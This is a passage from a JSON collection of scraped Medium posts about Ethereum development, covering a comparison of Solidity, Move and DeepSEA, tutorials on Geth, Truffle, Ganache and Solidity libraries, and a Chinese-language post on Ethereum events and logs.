a \u201cresource,\u201d which means that code outside the module cannot look into the contents of values of that type: they can only be moved between variables and passed to functions. This helps Move programmers make sure that resources are conserved, e.g. that the total number of outstanding tokens doesn\u2019t change.This type of system provides resource conservation guarantees that are generally useful, but they are not enough to ensure functional correctness \u2014 -and the Move designers agree.Third, as a matter of implementation, the Move compiler generates typed bytecode, and a \u201cbytecode verifier\u201d performs a sanity check on the output. This is in contrast to the Solidity compiler which type-checks the source program first, and then processes it to generate bytecode.By doing the type-checking last, Move can ensure the safety properties that are enforced by typing (in particular, conservation of resources) will hold. It is important to denote that this \u201cbytecode verifier\u201d serves as verification of a well-typed program, not a functionally correct program in and of itself. There can still be compiler bugs that cause a well-typed, but incorrect program.Overall, the additional limitations of Facebook\u2019s Move adds a layer of discipline that mitigates against the many avoidable vulnerabilities of Solidity. The aspects of security and correctness, however, are still treated as merely supplementary to the underlying language.This is because the Move language slightly advances the programming standards by offering a \u201cverification-friendly design.\u201d This still requires the creation of additional tooling, however, as opposed to the more elegant DeepSEA approach of directly integrating Formal Verification into the language itself, allowing developers to work with their contracts in an interactive proof assistant (in this case, Coq).DeepSEADeepSEA is a functional programming language that puts security first, using Formal Verification to secure code. By allowing a user to reason about a program (such as a smart contract) at a high level of abstraction, the process of determining correctness of code becomes seamless.The DeepSEA compiler can automatically output two things for each program: first, an executable bytecode and second, a model of the program which can be loaded into Coq. This approach offers a general purpose theorem and proving environment that allows the addition of manually written specifications \u2014 offering flexibility and compatibility along security.[An example of the DeepSEA to EVM compiler.]DeepSEA has similarities with other languages: much like Move, the program model will be limited and disciplined, compared to Solidity. DeepSEA has the same \u201ctree structured storage\u201d that the Move paper discusses (every location is accessible under a single path), allowing it to have a similar \u201cverification-friendly design.\u201dA major differentiation of the DeepSEA system from both Solidity and Move is that the DeepSEA compiler itself is written in Coq and proven correct. This means that, unlike basically all other systems, we can be certain that the semantics of the high-level language are preserved by the bytecode \u2014 and no new errors are introduced during the compilation. Whereas Move merely checks that the output of the code is well-typed, DeepSEA checks that the output is indeed correct (the correctness properties proven in the Coq model will be satisfied).The DeepSEA language was designed to apply a significant level of protection beyond what other languages are able to provide. In a world in which the created systems are decentralized, self-executable, permanent, and open-source, even the most minor errors may lead to significant \u2014 and often costly \u2014 problems.As a next-generation programming language, DeepSEA aims to apply the learnings of the past to lay the groundwork to create a more secure ecosystem for the future.As the blockchain ecosystem continues to mature, new programming languages have emerged to counteract some of the known issues of the last few years. While the first-mover advantage allowed Solidity to experience heavy adoption and familiarity, new languages such as Move and DeepSEA are attempting to learn from \u2014 and prevent \u2014 some of the mishaps of the past.Between the three, programmers have more options than ever to code as they see fit.", "responses": 0, "tags": ["Ethereum", "Libra", "Facebook", "Blockchain", "Crypto"]}, {"title": "Getting started with Ethereum, Solidity & Geth \u2014 part 2", "post_link": "https://medium.com/@wslyvh/getting-started-with-ethereum-solidity-geth-part-2-d195144fe6c7?source=search_post", "author_name": "Wesley van Heije", "author_link": "https://medium.com/@wslyvh", "publish_date": "2017-10-11", "last_modified_date": "2018-06-21", "readtime": "4.74", "claps": 197, "voters": 31, "content": "Getting started with Ethereum, Solidity & Geth \u2014 part 2Wesley van HeijeFollowOct 11, 2017 \u00b7 5 min readIf you\u2019ve been playing around a little bit with Solidity and testrpc it\u2019s time to interact to an actual network. In case you\u2019ve missed it, please see my Part 1 \u2014 Getting started with Ethereum & Solidity on Windows, to get started from scratch.Since testrpc is just a simulation for our connectivity to the network, we need to get an actual client to do the real work. There are multiple clients to do so, but we\u2019re going to use Geth for it here. Geth is the official golang implementation of the Ethereum protocol and is the most common for people wanting to interact with the Ethereum network. Geth comes bundled with Mist, but we are going to install it separately so we can launch and interact with specific configurations and commands.GethDuring installation, make sure to select \u2018Developer tools\u2019. We won\u2019t get into any details for now, but better be prepared while we\u2019re at it.* Install the Developer tools while we\u2019re at it.After installation, open up a PowerShell window and verify it is installed correctly.* Let\u2019s make sure our installation was successful.Choosing a networkSince we need to pay gas (Ether) to perform any transaction, you probably don\u2019t want spend real money by interacting with the main network just yet. So there are a few options to interact with a different network, where you can still safely get started first and have more control over execution.Network ID 1 \u2014 main Ethereum chain.Network ID 2 \u2014 late Morden test chain.Network ID 3 \u2014 Ropsten test chain.Network ID 4 \u2014 Rinkeby test chain.Network ID n \u2014 Any private chain.Note that test networks might change, so make sure you stay up-to-date with the correct ids. As for a private network, you can use any positive number as you like, but avoid using any publicly available networks.Private development networkThe easiest way to get started here is by using a private network. A private network gives you more control over the network. And since you don\u2019t have to sync with an existing chain yet, you\u2019re starting right from the first block. Making it much faster to start mining ether which you need to pay for gas.So let\u2019s start by making a default (coinbase) account from your PowerShell window. Coinbase is the default name of the account on your node that acts as your primary account. If you do mining, mining rewards will be credited to this account. You\u2019ll be prompted to enter a password and remember this for later use.geth --dev account newNote the --dev flag, which instructs Geth to use a pre-configured private developer network. Another option is --testnet which will connect to Ropsten or leaving it out to interact with the main Ethereum network.Now that we\u2019ve got our default account we can start our node.geth --dev --mine consoleWait until the DAG is generated completely and you see the first messages of new the mining work and new blocks that are successfully sealed. Since it\u2019s you\u2019re own, private new chain this will probably not take more than a few seconds. After that we can stop our miner for now.miner.stop()If everything went well, check the balance of our default account to make sure we indeed collected some ether. You can do so directly from the console.web3.fromWei(eth.getBalance(eth.coinbase), \"ether\")* Congratulations, you\u2019ve mined your first ether!So now that we have our client set-up and a default account, with some Ether to pay for the transactions, we should be able to continue. But in order to make a transaction we need to unlock our (default) account with the password we provided earlier. Otherwise you might end up with an error as showing below.* Error: authentication needed: password or unlockConfigure our accountsWe can do so manually with the following command from our Geth console.personal.unlockAccount(eth.accounts[0], \"password\", 15000)But since the last parameter is the time it stays unlocked it does require to unlock our account quite frequently. So what I prefer to do is to unlock my account immediately when starting Geth. Let\u2019s create a new txt file, which contains the password of your account, so we can use for the --password arguments. You can add multiple passwords (one on each line) if you want to unlock multiple accounts. But let\u2019s start with just one for now. Close all previous command windows, if you have anything running and start a new PowerShell window with the following command.geth --dev --rpc --rpcapi eth,net,web3,personal,miner --unlock '0' --password './pass.txt' consoleWhere \u20180\u2019 is the account you want to unlock (our default one) and password contains the relative path to our password file. Make sure to update it to where you\u2019ve saved yours. More details on all the command options can be found here.*Note that our account is unlocked.Before we can finally get back to our MetaCoin project there\u2019s just one last thing we need to do. Since we want to test that we can actually send a MetaCoin, we need a second account to send them to. So let\u2019s create one from our Geth console.personal.newAccount('password')If successful; the newly created address will be displayed below.Testing our MetaCoin projectSo now that we have configured everything we need, it is finally time to get back to our Solidity project. Open up our MetaCoin project from the previous part in Visual Studio Code. And let\u2019s test our project once again.truffle test* Our contracts will get compiled and deployed to our private network.But as you might notice, it seems like it\u2019s stuck on the first contract creation. This is just because our miner isn\u2019t running to process the transactions yet.So go ahead and start our miner.miner.start(1)As soon as you do, you will see our tests to continue with the same results as we\u2019ve had with testrpc.*Testing our default Truffle project.That\u2019s it! We\u2019ve deployed our contracts to an actual chain. Above steps can be done for any network you\u2019d like to interact with, by configuring Geth.", "responses": 9, "tags": ["Ethereum", "Solidity", "Geth", "Blockchain", "Software Development"]}, {"title": "All you should know about libraries in solidity", "post_link": "https://medium.com/coinmonks/all-you-should-know-about-libraries-in-solidity-dd8bc953eae7?source=search_post", "author_name": "Sarvesh Jain", "author_link": "https://medium.com/@sarvesh.sgsits", "publish_date": "2018-09-21", "last_modified_date": "2018-09-21", "readtime": "3.79", "claps": 478, "voters": 32, "content": "All you should know about libraries in soliditySarvesh JainFollowSep 21, 2018 \u00b7 4 min readPhoto by I\u00f1aki del Olmo on UnsplashIt\u2019s very important to know about the libraries in solidity while writing Dapps. In simple words, a library is the reusable piece of code which is deployed once and shared many times.But libraries are not just limited to reusability, there are few other areas where ethereum developers are using the library feature. This post aims to touch all those topics starting from basics.Let\u2019s start with a simple library for mathematical operation. The SafeMath library described below contains basic arithmetic operation which takes 2 unsigned integer as input and returns the arithmetic operation result.\u201cIdeally, libraries are not meant to change state of contract, it should only be used to perform simple operations based on input and returns result\u201dBefore going in depth, let\u2019s cover few prerequisite for better understanding:What is a contract in solidity? : Technically, smart contract is a basic building block of a Dapp. In ethereum, smart contract has address like external user account which can be used to make interaction with contract like calling method, sending ether etc. Each contract has these four properties:Nonce : It\u2019s a count of number of transaction triggered from an account.Balance: It\u2019s a number that tell about amount of ether this particular address holdsStorage root: Contract can store data, it\u2019s a root of tree which stores data from this contractCodehash : It\u2019s hashed value of contract code.2. Function types: Solidity has following function types:Internal: This type of function is only called from inside of contractExternal:This type of function is only called from outside of contractPublic: This type of function is called from outside of contract as well inside.Pure: This kind of function neither reads nor write to storage of contract.View: This kind of function can only read from storage but can\u2019t write from storage.Payable: A contract function can only accept ether if it\u2019s marked as payable.How library works?In blockchain, transaction can change state of smart contract. There are various kinds of state change that can happen in a contract:Sending ether: It will update balance of contractChanging data in contract: It will change storage root.\u201cWhenever user sends a transaction to a smart contract which is internally using library contract then state change happens on smart contract not in library contract. This is possible with delegate call feature of EVM\u201dDelegate Call:Paraphrased from the solidity docs:\u201cDelegatecall is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values.This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.\u201dThis low-level function has been very useful as it\u2019s the backbone for implementing libraries.Deployment of libraries:Library deployment is a bit different from regular smart contract deployment. There are two scenarios in the library deployment:Embedded Library: If a smart contract is consuming a library which have only internal functions than EVM simply embeds library into the contract. Instead of using delegate call to call a function, it simply uses JUMP statement(normal method call). There is no need to separately deploy library in this scenario.Linked Library : On the flip side, if a library contain public or external functions then library needs to be deployed. Deployment of library will generate unique address in blockchain. This address needs to be linked with calling contract.Let\u2019s consider simple example to understand linked libraries.Below code snippet shows a ERC20 contract with transfer function. There are two methods in SafeMath library \u201csub\u201d and \u201cadd\u201d used in transfer function which are external.There are two interesting observations to make.SafeMath library has external functions.2. String given below is part of the bytecode generated after compilation of ERC20 contract. This bytes code contains reference of SafeMath __SafeMath______________________________. This means that the bytes of ERC20 can\u2019t be deployed before performing linkage step. Linking essentially means replacing library reference in the byte code with it\u2019s address.0x608060405234801561001057600080fd5b50610343806100206000396000f300608060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063a9059cbb14610046575b600080fd5b34801561005257600080fd5b50610091600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506100ab565b604051808215151515815260200191505060405180910390f35b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205473__SafeMath______________________________63b67d77c59091846040518363ffffffff167c0100000000000000000000000000000000000How to link library contract during deployment?Deploy library : I have deployed SafeMath on ropsten and it\u2019s address is 0x40189fb71f54a3ad0370620dfb095382859eb095Link deployed library with the contract. Below command can be used to link SafeMath library with ERC20 contract.solc ERC20.sol \u2014 libraries \u201cSafeMath:0x40189fb71f54a3ad0370620dfb095382859eb095\u201d \u2014 binAfter successful linking, SafeMath references will be removed from the bytecode and contract is ready for deployment.\u2018Using for\u2019 in library:In solidity using X for Y directive means, library function of X is attached with type Y.For instance, Using SafeMath for uint256.SafeMath functions like add, sub, mul and div are now bound with type uint256.\u201cOne condition which should be taken care is, library functions will receive the object they are called on as their first parameter\u201dFor example: In ERC-20 contract mentioned above. Using for directive is using for SafeMath for type uint256.using SafeMath for uint256;uint256 a = 10;uint256 b= 10;uint256 = a.add(b);Here add function is available from SafeMath. SafeMath library functions are bound with uint256.Great!!! \ud83d\ude4cI hope, this article helped you to understand libraries in solidity.Happy Coding \ud83d\ude07Demystify Blockchain | Future is decentralised internetdemystifyblockchain.comlinkedin.com/in/jainsarveshmedium.com/@sarvesh.sgsits", "responses": 0, "tags": ["Ethereum", "Solidity", "Libraries", "Dapps", "Tutorial"]}, {"title": "Solidity Development: Setting up environment", "post_link": "https://medium.com/coinmonks/solidity-development-setting-up-environment-611c4bc2530b?source=search_post", "author_name": "Nikita Fedosenko", "author_link": "https://medium.com/@nfedosenko", "publish_date": "2018-03-27", "last_modified_date": "2018-06-20", "readtime": "4.67", "claps": 207, "voters": 31, "content": "Solidity Development: Setting up environmentNikita FedosenkoFollowMar 27, 2018 \u00b7 5 min readNowadays, everything related to crypto-world is becoming more and more popular. Bet you also thought about launching your own successful ICO with million\u2019s investments. Then, as we know, there is no gain without pain. But let\u2019s make development of smart contracts not as painful as it could be. Choosing the right development kit and setting up environment\u2014 is a first step to success. In this article we\u2019ll consider the most popular solutions for starting up your decentralized app, such as:Remix IDEIntellij-Solidity Plugin + Truffle + GanacheSolidity Extension for Visual Studio + Blockapps-blocRemix IDERemix \u2014 is a web-based IDE for writing, deploying and running Solidity smart contracts. For now, it\u2019s one of the most featured IDE for smart contracts. After opening the Remix website you\u2019ll see something like this:Remix IDE startup pageRemix offers you out-of-the-box ready solution for decentralized app development. You don\u2019t have to install any plugins or modules, just open the browser and start coding. Everything else is already done for you.Pros:Code highlighting and analysisTerminal with integrated JavaScript interpreter and the web3 objectRunning locally stored filesAbility to run transactions, deploy and compile smart contractsCons:Works only in web browserClearing of LocalStorage will remove all of your files (there is workaround with using RemixDIntellij-Solidity Plugin + Truffle + GanacheIntellij-Solidity \u2014 is a plugin for Itnellij-based IDEs such as Webstorm, PhpStorm, PyCharm etc. This plugin offers syntax highlighting, code formatting and autocomplete for Solidity files. Although, it doesn\u2019t provide any solutions for compiling and deploying contracts.Contract generated by Intellij-Solidity plugin in WebstormFor compiling and deploying we could use Truffle Framework with Ganache CLI.Truffle SetupFirstly, you have to install Truffle globally using npm package manager:npm install -g truffleThen you have to create a new directory for your project and go into it (directory has to be empty):mkdir MyFirstSolidityProjectcd MyFirstSolidityProject/And the last thing that we have to do for now is to init truffle in our project directory:truffle initAfter initializing truffle in our project directory, we\u2019ll get such files generated:Project structure generated by Truffle frameworkWe will discover why do we need these files in the next chapter. For now, we\u2019ll just add some code to our truffle.js file to make it looks like this:module.exports = {  networks: {    development: {      host: \"127.0.0.1\",      port: 7545,      network_id: \"*\" // Match any network id    }  }};Here we specified environment, called development and running on 127.0.0.1:7545. We\u2019ll use it for deploying our contracts to the local Ethereum network.Ganache CLI SetupNow we have to install Ganache CLI package globally with npm package manager:npm install -g ganache-cliGanache will run the local instance of Ethereum network on your machine, what may be useful in development and debugging. We have to run ganache on the port specified for our development environment (7545). This could be done by the next command:ganache-cli -p 7545After that you\u2019ll see the list of generated test accounts addresses, their private keys and mnemonic phrases for the walletOutput of running ganache-cli commandWrap UpNow we have local network up and running, so we can compile and migrate our project to that network. For doing this, we have to run the following commands:truffle compileIt\u2019ll generate json file for our contracts under ./build/contracts directory. Then we will migrate this data to the network using development environment:truffle migrate --network developmentPros:Can be used in many modern IDE\u2019s without breaking previous settingsSupports goto declarations, code completion, syntax highlightingProvide file templates for new generated contracts and librariesTruffle and Ganache provides a big variety of project setups with React, Redux, Authentication etcCons:Intellij-Solidity plugin is in alpha stage yet, so it could have some bugsA lot of actions has to be done manually for setting up compiling and deployment processSolidity extension for Visual Studio + Blockapps-blocSolidity extension enables smart contract development in Visual Studio IDE. It allows you to start a new project for your decentralized app with everything set up.Furthermore, this extension requires installing of blockapps-bloc package. This package allow you to run local Ethereum network (like ganache-cli).Blockapps-bloc SetupFirstly, we have to go to our project directory and install blockapps-bloc package using npm package manager:npm install blockapps-blocThen we have to initalize this module with name, username and apiUrl on your choice. You\u2019ll be prompted to fill that info after running the following command:bloc initAfter that, let\u2019s install required npm packages and start bloc package:npm installbloc startNow we have server running on default 8000 port. VS extension will use this server by default. You can check or change extension properties in Visual Studio under project properties section:Pros:Ability to setup multi-project applications with ASP.NET or Node.jsReady-to-use application templatesProvides compiling and deploying of smart contractsCons:Needs some additional packages installation (blockapps-bloc)A lot of issues from users, related to expired certificates that could make extension unavailable for some timeConclusionAll in all, we\u2019ve discovered the most popular solutions for setting up your environment and starting developing smart contracts on Solidity with ease. I hope you\u2019ve found something appropriate to your needs. In the next chapter we\u2019ll write our first smart contract and will deploy it to the local network.\u2764\ufe0f Like, Share, Leave your commentIf you like this post, don\u2019t forget to like, share with your friends and colleagues and leave your comment below about the post.And Follow me\u2026\u2026.", "responses": 7, "tags": ["Solidity", "Smart Contracts", "Ethereum", "Tutorial", "Solidity Tutorial"]}, {"title": "Solidity\u64b0\u5beb\u667a\u80fd\u5408\u7d04\u8207\u6ce8\u610f\u4e8b\u9805(\u4e8c)", "post_link": "https://medium.com/taipei-ethereum-meetup/solidity%E6%92%B0%E5%AF%AB%E6%99%BA%E8%83%BD%E5%90%88%E7%B4%84%E8%88%87%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A0%85-%E4%BA%8C-dd915bdeafa0?source=search_post", "author_name": "NIC Lin", "author_link": "https://medium.com/@twedusuck", "publish_date": "2017-01-12", "last_modified_date": "2018-11-03", "readtime": "7.55", "claps": 168, "voters": 31, "content": "Solidity\u64b0\u5beb\u667a\u80fd\u5408\u7d04\u8207\u6ce8\u610f\u4e8b\u9805(\u4e8c)NIC LinFollowJan 12, 2017 \u00b7 8 min read\u9019\u7bc7\u5c07\u4ecb\u7d39\u4ee5\u592a\u574a\u7684log\u8cc7\u6599\u53caevent\u7684\u4f7f\u7528\u985e\u4f3c\u65bc\u6bd4\u7279\u5e63\u7684OP_RETURN\uff0c\u4ee5\u592a\u574a\u4e5f\u63d0\u4f9b\u4e00\u500b\u628a\u8cc7\u6599\u6c38\u4e45\u5beb\u5165\u5340\u584a\u93c8\u88e1\u7684\u65b9\u6cd5 \u2014 event\uff0cevent\u6240\u5beb\u5165\u7684\u8cc7\u6599\u6703\u88ab\u8a18\u9304\u5728\u4e00\u500bReceipt\u8cc7\u6599\u88e1\u3002\u6bcf\u4e00\u7b46transaction\u90fd\u6703\u6709\u4e00\u500b\u5c0d\u61c9\u7684Receipt\uff0c\u7528\u4f86\u8a18\u9304\u9019\u7b46transaction\u7684\u57f7\u884c\u7d50\u679ceth.getTransaction()getTransaction\u53ef\u4ee5\u5f97\u5230\u9019\u7b46transaction\u7684\u76f8\u95dc\u8cc7\u6599\uff0c\u9019\u4e9b\u8cc7\u6599\u5728transaction\u88ab\u88fd\u4f5c\u51fa\u4f86\u7684\u6642\u5019\u5c31\u6709\u4e86\uff0c\u800cReceipt\u5247\u662f\u76f4\u5230\u88ab\u57f7\u884c\u5b8c(\u4e5f\u5c31\u662ftransaction\u88ab\u653e\u9032\u93c8\u88e1)\u5f8c\u624d\u6703\u6709\u3002\u8a3b\uff1a(1)gas\u662f\u6307\u9019\u6b21\u63d0\u4f9b\u7684gas\u7e3d\u91cf(2)input\u662f\u5408\u7d04\u7684code(\u9019\u662f\u4e00\u500b\u90e8\u7f72\u5408\u7d04\u7684transaction\uff0c\u6240\u4ee5input\u5c31\u662f\u6574\u4efd\u5408\u7d04\u7684code)\u3002\u7528 getTransacitonReceipt(\"transaction\u7684hash\u503c\")\u4f86\u53d6\u5f97transaction\u5c0d\u61c9\u7684Receipt\uff1aeth.getTransactionReceipt()\u8a3b\uff1a(1)gasUsed\u662f\u9019\u7b46transaction\u6240\u82b1\u8cbb\u7684gas(\u6211\u5011\u63d0\u4f9b\u4e864700000\uff0c\u53ea\u82b1\u4e86118615\uff0c\u5269\u4e0b\u7684\u6703\u9000\u9084\u7d66\u6211\u5011)(2)logs\u5247\u662f\u6211\u5011\u9019\u7bc7\u4ecb\u7d39\u7684log\uff0c\u5982\u679c\u6709event\u88ab\u89f8\u767c\uff0c\u8cc7\u6599\u5c31\u6703\u88ab\u5165\u5728\u9019\u90a3\u4ec0\u9ebc\u6642\u5019\u6703\u9700\u8981\u7528\u5230event\u5462\uff1f1. \u7576\u4f5c\u4e00\u500b\u984d\u5916\u7684\u5132\u5b58\u7a7a\u9593\uff0c\u800c\u4e14\u5f88\u4fbf\u5b9c\u3002event\u5beb\u5165\u7684\u6210\u672c\u548c\u7528\u5408\u7d04\u8b8a\u6578\u4f86\u5132\u5b58\u7684\u6210\u672c\u76f8\u6bd4\u4e4b\u4e0b\u5c11\u4e86\u5f88\u591a\uff0c\u5982\u679c\u4f60\u958b\u767c\u7684dapp\u9700\u8981\u5c07\u4f7f\u7528\u8005\u7684\u4f7f\u7528\u7d00\u9304(\u5982\u4ed8\u6b3e\u7d00\u9304)\u7b49\u8a18\u9304\u4e0b\u4f86\u7576\u4f5c\u8b49\u660e\uff0c\u8207\u5176\u7528\u4e00\u500b\u9663\u5217\u5132\u5b58\uff0c\u4e0d\u5982\u5728\u6bcf\u6b21\u4f7f\u7528\u6642\u7528event\u5beb\u9032log\u88e1\u3002\u4f46\u8981\u6ce8\u610f\u7684\u662f\uff0c\u9019\u4e9b\u5beb\u9032log\u88e1\u7684\u8cc7\u6599\u662f\u6c92\u8fa6\u6cd5\u88ab\u5408\u7d04\u6240\u5b58\u53d6\u7684\u30022. \u7576\u6210return value\u4f86\u4f7f\u7528\u3002\u5408\u7d04\u88e1\u51fd\u5f0f\u7684\u56de\u50b3\u503c\u4e26\u975e\u7e3d\u662f\u53ef\u4ee5\u4f7f\u7528\uff0c\u5047\u8a2d\u4e00\u500b\u6709\u56de\u50b3\u503c\u7684\u51fd\u5f0f\uff1acontract f00{    function foo(int _value) returns (int) {        return _value * _value;    }}\u4ec0\u9ebc\u6642\u5019\u4f60\u53ef\u4ee5\u62ff\u5230\u9019\u500b\u56de\u50b3\u503c\uff1f\u53ea\u6709\u5728\u4f60\u4f7f\u7528call\u5728\u672c\u5730\u9032\u884c\u6a21\u64ec\u7684\u6642\u5019\u624d\u6703\u6709\u56de\u50b3\u503c\uff0c\u5982\u4e0b\uff1avar ret = f00.foo.call(25);console.log(ret);    //625\u7576\u4f60\u4f7f\u7528sendTransaction\uff0c\u771f\u7684\u505a\u51fa\u4e00\u7b46\u4ea4\u6613\u7684\u6642\u5019\uff0c\u4ed6\u4e0d\u6703\u50b3\u56de\u4efb\u4f55\u4f60\u51fd\u5f0f\u57f7\u884c\u7684\u7d50\u679c\uff0c\u800c\u662f\u56de\u50b3\u4f60\u9019\u7b46transaction\u7684hash\u503c\uff0c\u6240\u4ee5\u9019\u6642\u5019\u4f60\u9700\u8981\u4f7f\u7528event\u4f86\u5c07\u56de\u50b3\u503c\u8a18\u9304\u8d77\u4f86\uff1acontract f00{    event retValue(int _value);        function foo(int _value) returns(int) {        return _value * _value;    }}\u73fe\u5728\u5728\u524d\u7aef\u4fbf\u53ef\u4ee5\u5229\u7528\u50cfjavascript\u90a3\u6a23\u76e3\u807d\u7684\u529f\u80fd\uff1avar retValueEvent = f00.retValue();retValueEvent.watch(function(err, result){    if(err){        console.log(err);        return;    }    console.log(result.args._value);});\u7576transaction\u88ab\u6536\u5165\u5340\u584a\u93c8\u88e1\u5f8c\uff0c\u5c31\u6703\u89f8\u767c\u76e3\u807d\u5668\u7136\u5f8c\u6309\u7167\u4f60\u8a2d\u5b9a\u7684callback\u51fd\u5f0f\u57f7\u884c\u5c0d\u61c9\u7684\u52d5\u4f5c\u3002\u5982\u679c\u8981\u7d50\u675f\u76e3\u807d\uff0c\u57f7\u884c retValueEvent.stopWatching()\u30023. \u6700\u5f8c\u4fbf\u662f\u7576\u4f60\u958b\u767cdapp\u7684\u6642\u5019\uff0c\u85c9\u7531\u89f8\u767cevent\u5beb\u5165log\uff0c\u518d\u89f8\u767c\u76e3\u807d\u5668\u57f7\u884c\u5c0d\u61c9\u52d5\u4f5c\uff0c\u5982\u6b64\u5b8c\u6210\u5f9e \u5916\u754c->\u93c8->\u93c8->\u5916\u754c \u4e00\u500b\u5b8c\u6574\u7684\u57f7\u884c\u904e\u7a0b\u3002\u5c0d\u4f7f\u7528\u8005\u4f86\u8aaa\u5c31\u50cf\u4e00\u500b\u662f\u5c0d\u8cc7\u6599\u5eab\u64cd\u4f5c\u7684\u52d5\u4f5c\uff0c\u53ea\u662f\u9019\u500b\u8cc7\u6599\u5eab\u8b8a\u6210\u4e86\u5340\u584a\u93c8\u3002\u63a5\u4e0b\u4f86\u4ee5\u7c21\u55ae\u7684\u4f8b\u5b50\u4f86\u4ecb\u7d39\u76e3\u807d\u5668\u66f4\u591a\u7684\u529f\u80fdcontract depositAccount {    event Deposit(address indexed _owner, uint _amount, uint _time);    function deposit() payable {        Deposit(msg.sender, msg.value, now);    }}\u9996\u5148\u5148\u4ecb\u7d39\u7b2c\u4e8c\u884c\u7684indexed\u3002\u5728Receipt\u88e1\u5982\u679c\u6709log\uff0c\u6703\u5beb\u5728logs\u6b04\u4f4d\u88e1\uff0c\u6bcf\u7b46log\u5176\u4e2d\u6709\u5169\u90e8\u5206\uff1adata\u548ctopics\u3002\u4e00\u822cevent\u5beb\u5165\u7684\u8cc7\u6599\u90fd\u6703\u5beb\u5728data\u88e1\uff0c\u4f46\u5982\u679c\u5728event\u7684\u8b8a\u6578\u52a0\u5165\u4e00\u500bindexed\u5c6c\u6027\uff0c\u5230\u6642\u5019\u89f8\u767c\u6642\u9019\u500b\u8b8a\u6578\u5c0d\u61c9\u5beb\u5165\u7684\u503c\u5c31\u6703\u5beb\u5728topics\u88e1\uff0c\u5728topcis\u88e1\u7684\u503c\u53ef\u4ee5\u7528\u4f86\u7576\u4f5c\u76e3\u807d\u5668\u7684\u7be9\u9078\u689d\u4ef6\u3002\u8a3b\uff1a\u4e00\u4efdReceipt\u88e1\u9762\u53ef\u4ee5\u6709\u5f88\u591a\u7b46log(\u8868\u793a\u4e00\u6b21transaction\u53ef\u4ee5\u89f8\u767c\u5f88\u591a\u6b21event)\uff0c\u4e00\u7b46log\u6700\u591a\u53ea\u80fd\u5132\u5b58\u56db\u500btopics\uff0c\u800c\u7b2c\u4e00\u500btopic\u5fc5\u9808\u662f\u9019\u500bevent\u7684\u8b58\u5225\u503cidentifier\uff0c\u4ee3\u8868\u4e00\u500bevent\u6700\u591a\u53ea\u80fd\u6709\u4e09\u500b\u8b8a\u6578\u53ef\u4ee5\u6709indexed\u5c6c\u6027\u3002transaction\u7684logs\u88e1\u7684\u5176\u4e2d\u4e00\u7b46log\u4e0a\u9762\u9019\u5f35\u5716\u662f\u5176\u4e2d\u67d0\u4e00\u7b46log\uff0c\u9019\u500bevent\u6c92\u6709\u52a0indexed\u7684\u8b8a\u6578\uff0c\u503c\u90fd\u6703\u5beb\u5728data\u6b04\u4f4d\u88e1(32byte\u70ba\u4e00\u55ae\u4f4d\u63a5\u5728\u4e00\u8d77\uff0c\u5716\u4e2d\u70ba\u5341\u516d\u9032\u4f4d\u76849\u548c19)\uff0ctopcis\u88e1\u552f\u4e00\u4e00\u500b\u503c 0x35bd26...\u662f\u8a72event\u7684\u8b58\u5225\u503c\u3002\u4e0b\u9762\u9019\u5f35\u5716\u662f\u8b8a\u6578\u90fd\u52a0\u4e0aindexed\u7684event\u7684log\u8a18\u9304\uff1aevent\u6709indexed\u56e0\u70ba\u6240\u6709\u8b8a\u6578\u90fd\u52a0\u4e0aindexed\uff0c\u6240\u4ee5data\u88e1\u6c92\u6709\u503c\uff0c\u503c\u90fd\u5beb\u5728topics\u88e1(\u5341\u516d\u9032\u4f4d\u7684102\u548cabcde)\u3002\u63a5\u4e0b\u4f86\u5728\u524d\u7aef\u52a0\u5165\u76e3\u807d\u5668\uff1avar depositEvent = depositAccount.Deposit({_owner:null},{fromBlock: 5000, toBlock: \u2018latest\u2019});depositEvent.watch(function(err, results) {    if (err) {        console.log(err);        return;    }    console.log(results.blockNumber);});\u7b2c\u4e00\u884c\u7684{fromBlock: 5000, toBlock: \u2018latest\u2019}\u662f\u52a0\u5165\u7684\u7be9\u9078\u689d\u4ef6\uff0c\u8868\u793a\u76e3\u807d\u5f9e\u7b2c5000\u500b\u5340\u584a\u958b\u59cb\u5230\u6700\u65b0\u7684\u5340\u584a\u3002\u5982\u679cevent\u88ab\u89f8\u767c\uff0c\u90a3callback\u51fd\u5f0f\u5c31\u6703\u5370\u51fa\u662f\u767c\u751f\u5728\u7b2c\u5e7e\u500b\u5340\u584a( result.blockNumber )\u3002\u5982\u679c\u6211\u5011\u8981\u7528\u6709\u52a0\u4e0aindexed\u7684\u8b8a\u6578(_owner\u8b8a\u6578)\u4f86\u7576\u7be9\u9078\u689d\u4ef6\u7684\u8a71\uff0c\u5c31\u6307\u5b9a_owner\u61c9\u8a72\u8981\u662f\u591a\u5c11\uff0c\u5982\u679c\u7d66null(\u50cf\u4e0a\u9762\u7684\u4f8b\u5b50)\uff0c\u90a3\u5c31\u662f\u4efb\u4f55address\u90fd\u53ef\u4ee5\u7684\u610f\u601d\uff1avar depositEvent = depositaccount.Deposit({_owner:'0xbd7255b64eeb594ca57652c94249da6a9b37cd2f'});depositEvent.watch(function(err, results) {    if (err) {        console.log(err);        return;    }    if(results.args._amount > web3.toWei(0.05,\"ether\")){        console.log(\"User: \" + results.args._owner +                    \" deposits: \" + results.args._amount +                    \" on: \" + JSON.stringify(new Date((parseInt(results.args._time)+28800)*1000))                   );    }});\u9019\u500bcallback\u6703\u5728\"0xbd7255b64eeb594ca57652c94249da6a9b37cd2f\"\u9019\u500baddress\u5b58\u9322\u7684\u6642\u5019\u88ab\u89f8\u767c\uff0c\u5b58\u5165\u8d85\u904e0.05 ether\u7684\u6642\u5019\u6703\u5370\u51fa\u5b58\u5165\u7684\u91d1\u984d\u548c\u5b58\u5165\u6642\u9593\u3002References:[1]https://media.consensys.net/technical-introduction-to-events-and-logs-in-ethereum-a074d65dd61e#.u7l9ejta3[2]https://github.com/ethereum/wiki/wiki/JavaScript-API#contract-events", "responses": 5, "tags": ["Blockchain", "Ethereum"]}, {"title": "Signatures: Verifying Messages in Solidity", "post_link": "https://blog.ricmoo.com/verifying-messages-in-solidity-50a94f82b2ca?source=search_post", "author_name": "RicMoo", 